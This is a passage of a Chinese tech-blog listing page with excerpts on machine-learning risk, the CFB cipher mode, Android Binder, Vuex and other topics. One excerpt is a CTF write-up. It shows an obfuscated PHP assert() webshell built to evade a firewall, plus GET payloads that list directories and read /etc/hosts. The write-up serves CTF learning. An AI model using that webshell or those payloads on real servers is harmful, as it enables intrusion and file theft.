期望风险是模型关于联合分布的期望损失，经验风险是模型关于训练样本集的平均损失。
其中，是关于联合分布的，但实际上由于是未知的，是不能计算的（若知道，则可直接求出条件概率分布，也就没必要学习模型了）。故正因为不知道，所以需要学习模型。
思路：根据大数定律，当样本容量N趋于无穷时，经验风险趋于期望风险。也就是用经验风险估计期望风险。
问题：由于现实中样本有限，用经验风险估计期望风险往往不理想，因此需要对经验风险进行矫正，则出现两个策略：经验风险最小化和结构风险最小化
（b）关键词：经验风险最小化、结构风险最小化
最优模型：经验风险最小的模型
经验风险最小化：
结构风险最小化：
当样本足够大时，经验风险最小化能保证有很好的效果（如极大似然估计），但是当样本容量很小时，经验风险最小化学习样本未必很好，会产生过拟合。因此，提出了结构风险最小化（等价于正则化），结构风险也就是在经验风险上加上表示模型复杂度的正则化项或罚项
其中，为模型的复杂度，模型越复杂，复杂度就越大，反之成立。是系数，用以权衡经验风险和模型复杂度。结构等闲小需要经验风险和模型复杂度同时小，这样才能保证有较好的预测效果。
结论：监督学习问题变成经验风险或结构风险函数最优化问题
3、算法 算法是指学习模型的具体计算方法，统计学习基于训练数据集，根据学习策略，从假设空间中选择最优模型，最后需要考虑用什么样的计算方法求解最优模型。
二、案例说明 1、流程
（1）损失函数、代价函数、目标函数
损失函数 = 代价函数，目标函数是一个与之相关但更广的概念，对于目标函数来说在有约束条件下的最小化就是损失函数。
上面三张图的函数分别为 、、。分别采用三个函数来拟合Price，其真实值为Y。
对于给定的x，预测的可能与Y相同，也有可能不同，为了衡量拟合效果的好坏，采用损失函数（代价函数）量化。损失函数越小，拟合效果越好。
问题：难道损失函数越小越好嘛？当然不是！
（2）经验风险、期望风险
风险函数是损失函数的期望（经验风险），是关于训练集的平均损失，目标就是经验风险最小化
问题：经验风险越小越好嘛？当然不是！
（3）结构风险
如果经验风险最小化，则 当然是经验风险函数最小了，但这明显是过拟合了。
不仅要让经验风险最小化，还要让结构风险最小化，也就定义了一个函数，专门用来模型复杂度的，在机器学习中称作正则化，常用的有L1，L2范数。
目标函数：最优化经验风险和结构风险
结论：
结构风险最小（模型复杂度最低），但是经验风险最大（拟合效果差）
结构风险和经验风险较好（拟合效果好）
结构风险最大（模型复杂度最高），但是经验风险最小（拟合效果最差）
参考李航《统计学习方法》和 https://blog.csdn.net/ganzhantoulebi0546/article/details/79617642
注：以上内容属个人理解，学艺不精，请各位大神多多指教
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8a5c41be3109d4c639c457fec89c959/" rel="bookmark">
			CFB模式解读
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一 什么是CFB模式
CFB模式全称Cipher FeedBack模式（密文反馈模式）。在CFB模式中，前一个密文分组会被送回到密码算法的输入端。所谓反馈，这里指的就是返回输入端的意思。
在ECB模式和CBC模式中，明文分组都是通过密码算法进行加密的，然而，在CFB模式中，明文分组并没有通过密码算法来直接进行加密。
明文分组和密文分组之间并没有经过“加密”这一步骤。在CFB模式中，明文分组和密文分组之间只有一个XOR。
CBC模式和CFB模式比较
二 初始化向量
在生成第一个密文分组时，由于不存在前一个输出的数据，因此需要使用初始化向量（IV）来代替。一般来说，我们需要在每次加密时生成一个不同的随机比特序列用作初始化向量。
三 CFB模式与流密码
CFB模式的结构和一次性密码本非常相似。一次性密码本是通过“明文”与“随机比特序列”进行XOR运算来生成“密文”的。而CFB模式则是通过将“明文分组”与“密码算法的输出”进行XOR运算来生成“密文分组”的。在通过 XOR来进行加密这一点上，两者是非常相似的。
在CFB模式中，密码算法的输出相对于一次性密码本中的随机比特序列。由于密码算法的输出是通过计算得到的，并不是真正的随机数，因此CFB模式不可能像一次性密码本那样具备理论上不可破译的性质。
CFB模式中由密码算法所生成的比特序列称为密钥流。在CFB模式中，密码算法相对于用来生成密钥流的伪随机数生成器，而初始化向量相当于伪随机数生成器的“种子”。
在CFB模式中，明文数据可以被逐比特加密，因此可以将CFB模式看作是一种使用分组密码来实现流密码的方式。
四 CFB模式的解密
CFB模式解密时，需要注意的是分组密码算法依然执行加密操作，密钥流是通过加密操作来生成的。
五 对CFB的攻击
对CFB模式可以实施重放攻击。 Alice向Bob发送一条消息，这条消息由4个密文分组组成。主动攻击者将该消息中的后3个密文分组保存了下来。第二天，Alice又向Bob发送了内容不同的4个密文分组（假设Alice使用了相同的密钥）。攻击者用昨天保存下来的3个密文分别将今天发送的后3个密文分组进行了替换。
于是，Bob解密时，4个分组中只有第1个可以解密成正确的明文分组，第2个会出错，而第3个和第4个则变成了被攻击者替换的内容（也就是昨天发送的明文内容）。攻击者没有破解密码，就成功地将以前的电文混入了新电文中。而第2个分组出错到底是通信错误呢，还是被人攻击所造成的呢？Bob是无法做出判断的。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21ab7e83d54ade37ae79418e86cd5596/" rel="bookmark">
			简单理解Binder机制的原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、概述 Android系统中，涉及到多进程间的通信底层都是依赖于Binder IPC机制。例如当进程A中的Activity要向进程B中的Service通信，这便需要依赖于Binder IPC。不仅于此，整个Android系统架构中，大量采用了Binder机制作为IPC（进程间通信）方案。
当然也存在部分其他的IPC方式，如管道、SystemV、Socket等。那么Android为什么不使用这些原有的技术，而是要使开发一种新的叫Binder的进程间通信机制呢？
为什么要使用Binder？
性能方面
在移动设备上（性能受限制的设备，比如要省电），广泛地使用跨进程通信对通信机制的性能有严格的要求，Binder相对出传统的Socket方式，更加高效。Binder数据拷贝只需要一次，而管道、消息队列、Socket都需要2次，共享内存方式一次内存拷贝都不需要，但实现方式又比较复杂。
安全方面
传统的进程通信方式对于通信双方的身份并没有做出严格的验证，比如Socket通信ip地址是客户端手动填入，很容易进行伪造，而Binder机制从协议本身就支持对通信双方做身份校检，因而大大提升了安全性。
二、 Binder IPC原理
从进程角度来看IPC机制
每个Android的进程，只能运行在自己进程所拥有的虚拟地址空间。对应一个4GB的虚拟地址空间，其中3GB是用户空间，1GB是内核空间，当然内核空间的大小是可以通过参数配置调整的。对于用户空间，不同进程之间彼此是不能共享的，而内核空间却是可共享的。Client进程向Server进程通信，恰恰是利用进程间可共享的内核内存空间来完成底层通信工作的，Client端与Server端进程往往采用ioctl等方法跟内核空间的驱动进行交互。
Binder原理
Binder通信采用C/S架构，从组件视角来说，包含Client、Server、ServiceManager以及binder驱动，其中ServiceManager用于管理系统中的各种服务。架构图如下所示：
Binder通信的四个角色
Client进程：使用服务的进程。
Server进程：提供服务的进程。
ServiceManager进程：ServiceManager的作用是将字符形式的Binder名字转化成Client中对该Binder的引用，使得Client能够通过Binder名字获得对Server中Binder实体的引用。
Binder驱动：驱动负责进程之间Binder通信的建立，Binder在进程之间的传递，Binder引用计数管理，数据包在进程之间的传递和交互等一系列底层支持。
Binder运行机制
图中Client/Server/ServiceManage之间的相互通信都是基于Binder机制。既然基于Binder机制通信，那么同样也是C/S架构，则图中的3大步骤都有相应的Client端与Server端。
注册服务(addService)：Server进程要先注册Service到ServiceManager。该过程：Server是客户端，ServiceManager是服务端。
获取服务(getService)：Client进程使用某个Service前，须先向ServiceManager中获取相应的Service。该过程：Client是客户端，ServiceManager是服务端。
使用服务：Client根据得到的Service信息建立与Service所在的Server进程通信的通路，然后就可以直接与Service交互。该过程：client是客户端，server是服务端。
图中的Client,Server,Service Manager之间交互都是虚线表示，是由于它们彼此之间不是直接交互的，而是都通过与Binder驱动进行交互的，从而实现IPC通信方式。其中Binder驱动位于内核空间，Client,Server,Service Manager位于用户空间。Binder驱动和Service Manager可以看做是Android平台的基础架构，而Client和Server是Android的应用层，开发人员只需自定义实现client、Server端，借助Android的基本平台架构便可以直接进行IPC通信。
Binder运行的实例解释
首先我们看看我们的程序跨进程调用系统服务的简单示例，实现浮动窗口部分代码：
//获取WindowManager服务引用 WindowManager wm = (WindowManager)getSystemService(getApplication().WINDOW_SERVICE); //布局参数layoutParams相关设置略... View view=LayoutInflater.from(getApplication()).inflate(R.layout.float_layout, null); //添加view wm.addView(view, layoutParams); 注册服务(addService)：在Android开机启动过程中，Android会初始化系统的各种Service，并将这些Service向ServiceManager注册（即让ServiceManager管理）。这一步是系统自动完成的。
获取服务(getService)：客户端想要得到具体的Service直接向ServiceManager要即可。客户端首先向ServiceManager查询得到具体的Service引用，通常是Service引用的代理对象，对数据进行一些处理操作。即第2行代码中，得到的wm是WindowManager对象的引用。
使用服务：通过这个引用向具体的服务端发送请求，服务端执行完成后就返回。即第6行调用WindowManager的addView函数，将触发远程调用，调用的是运行在systemServer进程中的WindowManager的addView函数。
使用服务的具体执行过程
client通过获得一个server的代理接口，对server进行调用。代理接口中定义的方法与server中定义的方法时一一对应的。client调用某个代理接口中的方法时，代理接口的方法会将client传递的参数打包成Parcel对象。代理接口将Parcel发送给内核中的binder driver。server会读取binder driver中的请求数据，如果是发送给自己的，解包Parcel对象，处理并将结果返回。整个的调用过程是一个同步过程，在server处理的时候，client会block住。因此client调用过程不应在主线程。 以上就是Binder机制原理的简单介绍，后面会以AIDL来具体介绍Binder机制的使用，加深对其的了解。
为了保护进程空间不被别的进程破坏或者干扰，Linux的进程是相互独立的（进程隔离），而且一个进程空间还分为用户空间和内核（Kernel）空间，相当于把Kernel和上层的应用程序抽像的隔离开。这里有两个隔离，一个进程间是相互隔离的，二是进程内有用户和内核的隔离。
Binder框架定义了四个角色：Server，Client，ServiceManager以及Binder驱动。其中Server，Client，ServiceManager运行于用户空间，驱动运行于内核空间。这四个角色的关系类似：Server是服务器，Client是客户终端，ServiceManager是服务注册中心（类似房屋中介）。
要进行Client-Server之间的通信，从面向对象的角度，在Server内部有一个Binder实体，在Client内部有一个Binder对象的引用，其实就是Binder的一个代理，Client通过对Binder引用间接的操作Server内部的Binder实体，这样就实现了通信。
但是现在的问题是会有很多个提供不同服务的Server（比如有媒体播放服务，音视频捕获服务等），而且会有很多Client（比如多个应用都要调用媒体播放服务），那么我们怎么才能够实现正确的Client调用正确的Server呢？就好比房客怎么才能够租到自己想要租的房子（联系上房东），这个时候中介就起到重要作用，房东想要出租自己的房子就必须要到中介注册，房客想要租房子就要去中介那里找，同样的道理，这里Client就是房客，Server就是房东，ServiceManager就是房屋中介，每个Server如果要提供服务就必须要去ServiceManager那里去注册，ServiceManager在一张查找表中记录一个Server的名字，对应着Server的引用。Client想要获得Server，必须通过名字到ServiceManager取找Server的引用，获得这个Server的binder引用，通过这个binder引用去和Server通信。
Binder机制 首先Binder是Android系统进程间通信(IPC)方式之一。
Binder使用Client－Server通信方式。Binder框架定义了四个角色：Server,Client,ServiceManager以及Binder驱动。其中Server,Client,ServiceManager运行于用户空间，驱动运行于内核空间。Binder驱动程序提供设备文件/dev/binder与用户空间交互，Client、Server和Service Manager通过open和ioctl文件操作函数与Binder驱动程序进行通信。
Server创建了Binder实体，为其取一个字符形式，可读易记的名字，将这个Binder连同名字以数据包的形式通过Binder驱动发送给ServiceManager，通知ServiceManager注册一个名字为XX的Binder，它位于Server中。驱动为这个穿过进程边界的Binder创建位于内核中的实体结点以及ServiceManager对实体的引用，将名字以及新建的引用打包给ServiceManager。ServiceManager收数据包后，从中取出名字和引用填入一张查找表中。但是一个Server若向ServiceManager注册自己Binder就必须通过0这个引用和ServiceManager的Binder通信。Server向ServiceManager注册了Binder实体及其名字后，Client就可以通过名字获得该Binder的引用了。Clent也利用保留的0号引用向ServiceManager请求访问某个Binder：我申请名字叫XX的Binder的引用。ServiceManager收到这个连接请求，从请求数据包里获得Binder的名字，在查找表里找到该名字对应的条目，从条目中取出Binder引用，将该引用作为回复发送给发起请求的Client。
当然，不是所有的Binder都需要注册给ServiceManager广而告之的。Server端可以通过已经建立的Binder连接将创建的Binder实体传给Client，当然这条已经建立的Binder连接必须是通过实名Binder实现。由于这个Binder没有向ServiceManager注册名字，所以是匿名Binder。Client将会收到这个匿名Binder的引用，通过这个引用向位于Server中的实体发送请求。匿名Binder为通信双方建立一条私密通道，只要Server没有把匿名Binder发给别的进程，别的进程就无法通过穷举或猜测等任何方式获得该Binder的引用，向该Binder发送请求。
###为什么Binder只进行了一次数据拷贝？
Linux内核实际上没有从一个用户空间到另一个用户空间直接拷贝的函数，需要先用copy_from_user()拷贝到内核空间，再用copy_to_user()拷贝到另一个用户空间。为了实现用户空间到用户空间的拷贝，mmap()分配的内存除了映射进了接收方进程里，还映射进了内核空间。所以调用copy_from_user()将数据拷贝进内核空间也相当于拷贝进了接收方的用户空间，这就是Binder只需一次拷贝的‘秘密’。
最底层的是Android的ashmen(Anonymous shared memory)机制，它负责辅助实现内存的分配，以及跨进程所需要的内存共享。AIDL(android interface definition language)对Binder的使用进行了封装，可以让开发者方便的进行方法的远程调用，后面会详细介绍。Intent是最高一层的抽象，方便开发者进行常用的跨进程调用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21ab7e83d54ade37ae79418e86cd5596/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60a74b5811eb53d0643ee03f63f8ce3c/" rel="bookmark">
			HiBlock社区:区块链链上数据的认知与探索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		跨界知识聚会系列文章，“知识是用来分享和传承的”，各种会议、论坛、沙龙都是分享知识的绝佳场所。我也有幸作为演讲嘉宾参加了一些国内的大型会议，向大家展示我所做的一些成果。从听众到演讲感觉是不一样的，把知识分享出来，你才能收获更多。
关于作者
张丹(Conan), 程序员/Quant: Java,R,Nodejsblog: http://blog.fens.meemail: bsspirit@gmail.com 转载请注明出处：
http://blog.fens.me/meeting-hiblock-20180826
前言
数字货币百花齐放，数字货币开发是区块链开发者的必修课也是入门课，通过ERC20智能合约很快就可以掌握开发技巧，但数字货币的安全如何保障？数字货币交易过程中产生了大量的数据，资金流转规律、操盘方式、筹码分布等等，通过数据预测数字货币价格走势也不是没有可能，除此之外区块链产生的数据还有什么价值？
本次的沙龙2个主题，一个是安全，一个是数据。
目录
我的演讲主题：区块链链上数据的认知与探索会议体验和照片分享 1. 我的演讲主题：区块链链上数据的认知与探索 本次的沙龙2个主题，一个是安全，一个是数据，都是技术流！！所以，来听的也都是技术流，很少人，但很聊的来。
我本次分享的主题为：区块链链上数据的认知与探索，PPT下载，主要内容来自我的1篇博客文篇：区块链链上数据的认知与探索(未发布)。 分享主题的目录大纲如下：
认识区块链区块浏览器链上数据探索 主题简介：区块链上所有的交易都是公开透明的，链上账本会记录所有参与者交易行为，包括资金流转规律，庄家操盘，筹码分布等，价值巨大，从数据科学的角度，分享对区块链链上数据进行的认知与探索。
本此分析主要是从数据的角度切入，开始先介绍区块链，让大家有所认知；然后介绍区块链有什么样的数据，区别场内数据和场外数据；最后引出主题，对场外数据进行数据探索，通过账本的交易流水发现这些数据中的规律性的行为，坐庄行为，散户行为，拉盘行为….
数据是很有意思的，希望大家能够了解链上数据，用技术的武器去发现和鉴别真实的交易。
2. 会议体验和照片分享 本次线下沙龙的核心主题为，技术维度解读数字货币安全与数据价值，会议的主页：http://www.huodongxing.com/event/3453087067011
30人的小沙龙，定位就是区块链的技术圈，同业交流。我的分享是 “区块链链上数据的认知与探索” 也是在我这次转型积累的新的经验，跨学科的知识结合，从数据的角度理解区块链。
会议主题：
14:00-14:05 开场 主办方介绍14:05-14:30 参会者自我介绍14:30-15:30《智能合约审计》分享嘉宾：赵威15:30-16:30《区块链链上数据的认知与探索》分享嘉宾：张丹16:30-17:00 合影 交流 我的介绍和照片分享。
分布式科技CTO，《R的极客理想-量化投资篇》作者，微软MVP。10年编程经验，获得10项SUN及IBM技术认证。前民生银行大数据分析师。个人博客 http://fens.me， Alexa全球排名70K。
2.2 会议相关照片
本次的场地在北京朝阳区建国路89号华贸商务楼16号B1 联合创业办公社，看上去更像是一个活动吧。
主持人：成芳
张丹，区块链链上数据的认知与探索
赵威, 智能合约审计
会后交流
政策条文: 分享开始前特意被关照，只能讲技术，不要讲其他的，最近太敏感，可能随时会被叫停！我们搞技术的人，底线是一定不会触碰的！！
布置会场。
大合照
主办方的小伙伴很辛苦，就一个小姑娘！坚持支持分享，保持高质量，坚持！坚持！
转载请注明出处：
http://blog.fens.me/meeting-hiblock-20180826
This entry was posted in 活动聚会
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e097ae3740f05f89f86fc5c84dbe09d/" rel="bookmark">
			mysql查询某一字段中某一字符串出现多次
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		中字符出现两次
UPDATE a SET cola= SUBSTR(cola,LOCATE('中',cola)+1,LENGTH(cola)) WHERE CHAR_LENGTH(cola)-CHAR_LENGTH(REPLACE(cola,'中',''))=2;
同时包含 ab 与c 1ab2c这样的 提取2c
UPDATE a SET cola= SUBSTR(cola,LOCATE('ab',cola)+2,LENGTH(cola))
WHERE LOCATE('c',cola) &lt; LOCATE('ab',cola) AND cola LIKE '%ab%' AND cola LIKE '%c%';
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/048069138ac600f339d22b9a8769688b/" rel="bookmark">
			const与var的比较
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		var声明了一个变量，并且可以同时初始化该变量。
let语句声明一个块级作用域的本地变量，并且可选的赋予初始值。
const 声明创建一个只读的常量，作用域与let相同。这不意味着常量指向的值不可变，而是变量标识符的值只能赋值一次。
const和var的明显区别是，const声明的是常量，不可被后面的代码赋值改变： var x = 1; x = 2; console.log(x);//2;-----var声明的是变量，可被赋值替换 const y = 1; y = 2; console.log(y);//Assignment to constant variable.;------const声明的是常量，不可改变 转载于:https://www.cnblogs.com/gy-dxj/p/9562537.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6a08b954e522789060cd698050cd373/" rel="bookmark">
			JDBC中，用于表示数据库连接的对象是。(选择1项)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JDBC中，用于表示数据库连接的对象是。(选择1项)
A．Statement
B．Connection
C. DriverManager
D．PreparedStatement
解答：B
转载于:https://www.cnblogs.com/borter/p/9562387.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1922d2ad8f81ef17f6682817f6bed7e0/" rel="bookmark">
			虚拟机拷贝文件到U盘(VMware Workstation 14)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 连接虚拟机和本地电脑 插入U盘 稍等片刻 打开终端，命令复制 断开虚拟机与本地电脑的连接 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e712e337c1e0b2e2995051a5560eb79/" rel="bookmark">
			Vue的状态管理器：Vuex
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		欢迎大家访问我的个人网站 - Sunday俱乐部
这一章我们来学习Vuex，如果要学习好Vuex那么最最重要的就是要知道Vuex是干嘛的，我们为什么需要Vuex。因为对于Vuex来说，它的使用方式非常简单，知识点也不多。Vuex唯一的难点就是很多人无法理解它。所以在本章我们会着重的讲解Vuex的作用，我们为什么需要它，在理解了这些之后，我们再去学习Vuex的使用就会水到渠成了。
状态管理 我们直接来看这一段代码：
&lt;div id="app"&gt; &lt;com-1&gt;&lt;/com-1&gt; &lt;com-2&gt;&lt;/com-2&gt; &lt;/div&gt; &lt;script type="text/x-template" id="com-1"&gt; &lt;div&gt; &lt;input type="button" @click="addCount" value="count++"&gt; &lt;/div&gt; &lt;/script&gt; &lt;script type="text/x-template" id="com-2"&gt; &lt;div&gt; count: {{count}} &lt;/div&gt; &lt;/script&gt; &lt;script&gt; Vue.component('com-1', { template: '#com-1', data: function () { return { count: 0 } }, methods: { addCount: function () { this.count += 1; } } }); Vue.component('com-2', { template: '#com-2', data: function () { return { count: 0 } }, }); var vm = new Vue({ el: '#app', }); &lt;/script&gt; 复制代码 在这段代码中，我们期望能够通过点击com-1中的count++按钮来改变com-2中的count，使其每点击一下自加一。基于这个需求我们应该如何去实现呢？基于我们现在所学到的知识，一共有两种解决办法，我们来看一下。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8e712e337c1e0b2e2995051a5560eb79/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d25183144186b64f1284263af93f332/" rel="bookmark">
			bugku——过狗一句话（奇淫技巧）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天学校ctf战队给了个bugku的题不过改了一下，我觉得挺有意思的，做一下记录。
题目 &lt;?php $poc = "a#s#s#e#r#t"; $poc_1 = explode("#", $poc); $poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3] . $poc_1[4] . $poc_1[5]; $poc_2($_GET['s']) ?&gt; exlpde()分割a#s#s#e#r#t为assert，使用assert()函数的解析传进来的s串，assert有代码执行漏洞。
解题payload
?s=print_r(scandir('./')) 扫描当前目录，并按数组输出。
url添加f94lag.txt，就可以拿到flag了。
奇淫技巧 利用此漏洞查询其他文件，例如hosts
首先，扫描上级目录，payload
?s=print_r(scandir('../')) 看到这是linux操作系统的文件目录
所以hosts应该在etc里面，读一下就能看到了。
2. 使用fopen() 或者 readfile() 函数读取文件
样例payload
?s=print_r(readfile('../etc/hosts')) ?s=print_r(fopen('../etc/hosts','r')) 任意文件读取，实在太骚了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45cdaf85ded7c7cb590d189b38803c74/" rel="bookmark">
			httprunner示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.cnblogs.com/botoo/p/8513403.html
补充一下数据驱动那里
准备csv数据：可以用txt或sublime text编辑完后保存成csv格式。多列用英文逗号隔开，第一行必须为参数名称
再将.csv文件放在与测试用例文件相同的目录中
在config中添加如下
"parameters":[
{"postid":"${P(postid.csv)}"}
], 调用即$postid
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f7cdd9d8479ca5f7cd66b920fb578f1/" rel="bookmark">
			HDU 5895  Mathematician QSC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		矩阵快速幂，欧拉函数
Hint: \(g(n)=\frac{f(n)f(n+1)}{2}\)
#include&lt;bits/stdc++.h&gt; using namespace std; #define rep(i,a,b) for(int i=a;i&lt;=b;++i) #define ms(arr,a) memset(arr,a,sizeof arr) #define debug(x) cout&lt;&lt;"&lt; "#x" = "&lt;&lt;x&lt;&lt;" &gt;"&lt;&lt;endl long long n,y,x,s; long long F; struct matrix { long long a,b,c,d; matrix(){} matrix(long long m,long long n,long long p,long long q):a(m),b(n),c(p),d(q){} matrix(long long x):a(x),b(0),c(0),d(x){} }; matrix solve(matrix A,matrix B) { matrix ret; ret.a=(A.a*B.a+A.b*B.c)%F; ret.b=(A.a*B.b+A.b*B.d)%F; ret.c=(A.c*B.a+A.d*B.c)%F; ret.d=(A.c*B.b+A.d*B.d)%F; return ret; } long long solve(long long x,long long y) { return x*y%(s+1); } template&lt;typename T&gt; T quick_pow(T a,long long n) { T ret(1); while(n) { if(n&amp;1)ret=solve(ret,a); a=solve(a,a); n&gt;&gt;=1; } return ret; } long long phi(long long n) { long long ret=n; for(long long i=2;i&lt;(long long)sqrt(n)+1;++i) { if(n%i==0)ret=ret/i*(i-1); while(n%i==0)n/=i; } if(n&gt;1)ret=ret/n*(n-1); return ret; } int main() { int T;scanf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4f7cdd9d8479ca5f7cd66b920fb578f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88b5f9d52262ce725216fe48513d012e/" rel="bookmark">
			flutter在tab切换的时候，怎么让他不执行initState
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章来源:https://blog.csdn.net/qq_33559682/article/details/80694987,感谢qq_33559682
第一次加载2个Tab页面：LoadImgByNetPage，LoadImgByLocPage Log所示: 反复切换2个Tab页面：LoadImgByNetPage，LoadImgByLocPage Log所示: 解决方案
在LoadImgByNetPage，LoadImgByLocPage中添加AutomaticKeepAliveClientMixin，并设置为true,这样就能一直保持当前不被initState了。
class _LoadImgByLocAppPageState extends State&lt;LoadImgByLocAppPage&gt; with AutomaticKeepAliveClientMixin{ @override void initState() { // TODO: implement initState super.initState(); print('_LoadImgByLocAppPageState initState'); } @override Widget build(BuildContext context) { // TODO: implement build return new Scaffold( body: new ListView( children: &lt;Widget&gt;[ new Image.asset('images/ic_assignment_ind_36pt.png'), new Divider(), new Image( image: new AssetImage('images/ic_assignment_ind_36pt.png'), ), new Divider(), ], ), ); } // TODO: implement wantKeepAlive @override bool get wantKeepAlive =&gt; true; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/247b53ff00724ab2f7aa4b1aa48441e8/" rel="bookmark">
			解决svchost占用内存过高问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		摘抄自：https://jingyan.baidu.com/article/d169e1867cea7e436611d801.html
svchost占用内存过高，会导致内存100%电脑卡住，CPU温度升高，散热风扇一直狂转，下面小编教大家怎么解决，供大家参考！
工具/原料 win10 方法/步骤 鼠标右键单击此电脑，选择管理进入，如下图所示
进入管理界面，双击右侧的服务与程序，如下图所示
在服务与程序界面双击服务进入，如下图所示
在服务列表找到Windows Update服务，如下图所示
双击Windows Update服务进入，将启动类型设置为手动，然后点击应用按钮，如下图所示
接下来在服务中找到Superfetch这个服务，如下图所示
双击Superfetch这个服务，将启动类型改为手动，然后点击确认按钮，重启电脑svchost占用内存会显著下降了，如下图所示 转载于:https://www.cnblogs.com/Devopser/p/9547783.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/88f6618de923ed833cab5790cf1b6aec/" rel="bookmark">
			Android自定义权限使用总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在研究关于android自定义权限的问题，关于自定义权限一般是保证APP的安全性，那么什么事自定义权限？今天我们来补充一下自己的知识
作者：BrightVan 地址：www.jianshu.com/p/b60cde583…
1、如何声明自定义权限 在Manifest文件中使用Permission标签定义自己的权限：
&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.bright.permission"&gt; &lt;permission android:name="com.bright.permission.TEST" android:description="" android:permissionGroup="com.bright.permission-group.TEST" android:protectionLevel="signature" /&gt; ...&lt;/manifest&gt; 复制代码 解释下各个属性：
name，该标签就是权限的名字。
description，该标签就是权限的介绍。
permissionGroup，指定该权限的组。
protectionLevel，指定保护级别。
Android将权限分为若干个保护级别，normal, dangerous, signature等。normal就是正常权限，该权限并不会给用户或者设备的隐私带来风险；dangerous就是危险权限，该级别的权限通常会给用户的数据或设备的隐私带来风险；signature指的是，只有相同签名的应用才能使用该权限。更多的介绍可以参考protectionLevel。
2、使用场景 自定义权限一般用于暴露出去的组件，提高安全性。Android允许一个应用（客户端）调用另一个应用（服务端）的组件。那么作为服务端的应用就得暴露相应的组件，客户端应用才能访问。当然，在暴露的时候，权限是非必须的，如果暴露的组件没有权限的话，那么任何的其他应用都可以来调用该组件；如果该组件申请了权限，那么只有拥有该权限的应用才能调用该组件。
&lt;activity android:name=".TestA_Activity" android:exported="true" ... /&gt; 复制代码 exported属性就是代表是否暴露。该例子并没有要求调用者需要申请权限，也就是说，任何的应用就可以调用才组件。如果每个应用都可以调用我们的组件的话，显然是不安全的，我们希望只有使用了我们的权限的应用，才能调用我们暴露的组件，我们可以在activity中加入permission属性。
&lt;activity android:name=".TestA_Activity" android:exported="true" ... /&gt; 复制代码 Intent intent = new Intent();intent.setClassName("com.bright.permission", "com.bright.permission.TestA_Activity");startActivity(intent); 复制代码 除了上面的方式，还可以通过intent-filter隐式启动：
&lt;activity android:name=".TestA_Activity" android:exported="true" ... &gt; &lt;intent-filter&gt; &lt;action android:name="com.bright.permission.action.TEST"/&gt; &lt;category android:name="android.intent.category.DEFAULT"/&gt; &lt;/intent-filter&gt;&lt;/activity&gt; 复制代码 Intent intent = new Intent();intent.setAction("com.bright.permission.action.TEST");startActivity(intent); 复制代码 3、自定义权限注意点 3.1、两个应用声明了相同的权限 Android不允许两个不同的应用定义一个相同名字的权限（除非这两个应用拥有相同的签名），所以在命名的时候，需要特别注意。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/88f6618de923ed833cab5790cf1b6aec/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/34f76f96e40056cba404fd6f2be18acf/" rel="bookmark">
			R语言-管道函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		符号：%&gt;%这是管道操作，其意思是将%&gt;%左边的对象传递给右边的函数。 说明：％&gt;％来自dplyr包的管道函数，其作用是将前一步的结果直接传参给下一步的函数，从而省略了中间的赋值步骤，可以大量减少内存中的对象，节省内存 作用：作为第一个选项的设置（或剩下唯一一个选项的设置）** x %&gt;% f(y) 等同于 f(x, y) y %&gt;% f(x, ., z) 等同于 f(x, y, z )
